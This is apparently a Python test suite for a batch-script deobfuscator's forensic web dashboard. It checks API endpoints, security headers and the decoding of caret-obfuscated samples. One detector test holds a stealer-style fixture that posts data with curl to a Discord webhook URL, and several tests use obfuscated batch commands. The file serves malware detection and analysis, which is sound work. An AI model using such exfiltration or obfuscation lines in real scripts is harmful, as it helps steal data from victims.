"""
Automated Test Suite for Batch Deobfuscator Real-Time Forensic Web Dashboard.
Validates HTTP REST endpoints, SPA HTML assets, background daemon threading,
signature detections, entropy profiling API, CORS headers, error handling, and clean shutdown.
"""

import json
import unittest
import urllib.request
import urllib.error
import urllib.parse
from http.server import ThreadingHTTPServer

from deobfuscator import __version__
from deobfuscator.dashboard_assets import get_dashboard_html
from deobfuscator.dashboard_server import (
    start_dashboard_background,
    run_all_detectors,
    BUILTIN_SAMPLES,
)


class TestDashboardServer(unittest.TestCase):
    server: ThreadingHTTPServer
    server_url: str

    @classmethod
    def setUpClass(cls):
        # Bind to port 0 to let OS allocate an available ephemeral port
        cls.server, cls.thread, cls.server_url = start_dashboard_background(
            host="127.0.0.1",
            port=0
        )

    @classmethod
    def tearDownClass(cls):
        cls.server.shutdown()
        cls.server.server_close()

    def http_get(self, path: str):
        url = f"{self.server_url}{path}"
        req = urllib.request.Request(url)
        with urllib.request.urlopen(req) as resp:
            status = resp.status
            headers = dict(resp.headers)
            body = resp.read().decode("utf-8")
            return status, headers, body

    def http_post(self, path: str, data: dict):
        url = f"{self.server_url}{path}"
        payload = json.dumps(data).encode("utf-8")
        req = urllib.request.Request(
            url,
            data=payload,
            headers={"Content-Type": "application/json"},
            method="POST"
        )
        with urllib.request.urlopen(req) as resp:
            status = resp.status
            headers = dict(resp.headers)
            body = resp.read().decode("utf-8")
            return status, headers, body

    def test_get_root_dashboard_html(self):
        status, headers, body = self.http_get("/")
        self.assertEqual(status, 200)
        self.assertIn("text/html", headers.get("Content-Type", ""))
        self.assertIn("BATCH-DEOBFUSCATOR // FORENSIC DASHBOARD", body)
        self.assertIn(f"v{__version__}", body)
        self.assertNotIn("https://", body)  # Zero external leaks!

    def test_get_api_health(self):
        status, headers, body = self.http_get("/api/health")
        self.assertEqual(status, 200)
        data = json.loads(body)
        self.assertEqual(data["status"], "ok")
        self.assertEqual(data["version"], __version__)
        self.assertEqual(data["engines_count"], 18)
        self.assertTrue(data["cccs_ready"])

    def test_get_api_heuristics(self):
        status, headers, body = self.http_get("/api/heuristics")
        self.assertEqual(status, 200)
        data = json.loads(body)
        self.assertIn("heuristics", data)
        self.assertGreaterEqual(len(data["heuristics"]), 10)
        first = data["heuristics"][0]
        self.assertIn("id", first)
        self.assertIn("name", first)
        self.assertIn("score", first)

    def test_get_api_samples_catalog(self):
        status, headers, body = self.http_get("/api/samples")
        self.assertEqual(status, 200)
        data = json.loads(body)
        self.assertIn("samples", data)
        sample_ids = [s["id"] for s in data["samples"]]
        self.assertIn("BatCloak", sample_ids)
        self.assertIn("0xidiz3r", sample_ids)
        self.assertIn("Somalifuscator", sample_ids)

    def test_get_api_single_sample(self):
        status, headers, body = self.http_get("/api/samples/BatCloak")
        self.assertEqual(status, 200)
        data = json.loads(body)
        self.assertEqual(data["id"], "BatCloak")
        self.assertIn("&cls", data["script"])

    def test_get_api_sample_not_found(self):
        with self.assertRaises(urllib.error.HTTPError) as ctx:
            self.http_get("/api/samples/NonExistentCorpusXYZ")
        self.assertEqual(ctx.exception.code, 404)

    def test_get_unknown_route(self):
        with self.assertRaises(urllib.error.HTTPError) as ctx:
            self.http_get("/api/invalid_route")
        self.assertEqual(ctx.exception.code, 404)

    def test_options_cors_preflight(self):
        url = f"{self.server_url}/api/analyze"
        req = urllib.request.Request(url, method="OPTIONS")
        with urllib.request.urlopen(req) as resp:
            self.assertEqual(resp.status, 204)
            self.assertEqual(resp.headers.get("Access-Control-Allow-Origin"), "*")

    def test_post_api_analyze(self):
        script = (
            "@echo off\r\n"
            "set a=c^m^d\r\n"
            "set b=/c w^h^o^a^m^i\r\n"
            "%a% %b%\r\n"
        )
        status, headers, body = self.http_post("/api/analyze", {"script": script})
        self.assertEqual(status, 200)
        data = json.loads(body)
        self.assertIn("entropy", data)
        self.assertIn("detections", data)
        self.assertIn("cccs_traits", data)
        self.assertGreater(data["entropy"]["global_entropy"], 2.0)
        self.assertEqual(data["entropy"]["total_lines"], 4)

    def test_post_api_analyze_empty(self):
        status, headers, body = self.http_post("/api/analyze", {"script": ""})
        self.assertEqual(status, 200)
        data = json.loads(body)
        self.assertEqual(data["entropy"]["global_entropy"], 0.0)

    def test_post_api_deobfuscate(self):
        script = (
            "@echo off\r\n"
            "set a=c^m^d\r\n"
            "set b=/c w^h^o^a^m^i\r\n"
            "%a% %b%\r\n"
        )
        status, headers, body = self.http_post(
            "/api/deobfuscate",
            {"script": script, "passes": 10}
        )
        self.assertEqual(status, 200)
        data = json.loads(body)
        self.assertIn("deobfuscated_script", data)
        self.assertIn("diff", data)
        self.assertIn("entropy", data)
        self.assertIn("meta", data)
        self.assertIn("cmd /c whoami", data["deobfuscated_script"])
        self.assertIn("clean_global_entropy", data["entropy"])
        self.assertIn("entropy_delta", data["entropy"])

    def test_post_malformed_json_body(self):
        url = f"{self.server_url}/api/analyze"
        req = urllib.request.Request(
            url,
            data=b"this is not valid { json",
            headers={"Content-Type": "application/json"},
            method="POST"
        )
        with self.assertRaises(urllib.error.HTTPError) as ctx:
            urllib.request.urlopen(req)
        self.assertEqual(ctx.exception.code, 400)

    def test_post_unknown_endpoint(self):
        with self.assertRaises(urllib.error.HTTPError) as ctx:
            self.http_post("/api/unknown_post_endpoint", {"data": 123})
        self.assertEqual(ctx.exception.code, 404)

    def test_run_all_detectors(self):
        script = (
            "&cls\r\n"
            "set %RANDOM%=noise\r\n"
            "set WH=https://discord.com/api/webhooks/123/token\r\n"
            "curl -X POST %WH%\r\n"
        )
        dets = run_all_detectors(script)
        self.assertIn("batcloak", dets)
        self.assertIn("batchstealer", dets)
        self.assertTrue(dets["batcloak"]["detected"])
        self.assertTrue(dets["batchstealer"]["detected"])

    def test_builtin_samples_integrity(self):
        self.assertGreaterEqual(len(BUILTIN_SAMPLES), 8)
        for name, info in BUILTIN_SAMPLES.items():
            self.assertIn("name", info)
            self.assertIn("script", info)
            self.assertGreater(len(info["script"]), 10)

    def test_get_dashboard_html_structure(self):
        html = get_dashboard_html("1.20.0")
        self.assertTrue(html.startswith("<!DOCTYPE html>"))
        self.assertIn("heatmap-strip", html)
        self.assertIn("v1.20.0", html)

    def test_cli_parser_web_flags(self):
        from deobfuscator.cli import create_parser
        parser = create_parser()
        opts = parser.parse_args(["--web", "--port", "9090", "--host", "0.0.0.0", "--no-browser"])
        self.assertTrue(opts.web_dashboard)
        self.assertEqual(opts.port, 9090)
        self.assertEqual(opts.host, "0.0.0.0")
        self.assertTrue(opts.no_browser)

    def test_cli_parser_dashboard_alias(self):
        from deobfuscator.cli import create_parser
        parser = create_parser()
        opts = parser.parse_args(["--dashboard"])
        self.assertTrue(opts.web_dashboard)

    def test_nosniff_security_header(self):
        status, headers, _ = self.http_get("/")
        self.assertEqual(headers.get("X-Content-Type-Options"), "nosniff")

    def test_post_oversized_payload_rejection(self):
        url = f"{self.server_url}/api/analyze"
        req = urllib.request.Request(
            url,
            data=b"{}",
            headers={"Content-Type": "application/json", "Content-Length": str(25 * 1024 * 1024)},
            method="POST"
        )
        with self.assertRaises(urllib.error.HTTPError) as ctx:
            urllib.request.urlopen(req)
        self.assertEqual(ctx.exception.code, 413)

    def test_post_deobfuscate_multi_pass_convergence(self):
        # Complex multi-step slicing and carets
        script = (
            "@echo off\r\n"
            "set _p=c^m^d\r\n"
            "set _a=%_p:~0,1%\r\n"
            "s^e^t _b=m^d\r\n"
            "set _c=w^h^o^a^m^i\r\n"
            "%_a%%_b% /c %_c%\r\n"
        )
        status, headers, body = self.http_post(
            "/api/deobfuscate",
            {"script": script, "passes": 15}
        )
        self.assertEqual(status, 200)
        data = json.loads(body)
        self.assertIn("cmd /c whoami", data["deobfuscated_script"])
        self.assertGreaterEqual(data["meta"]["passes_executed"], 1)


if __name__ == "__main__":
    unittest.main()
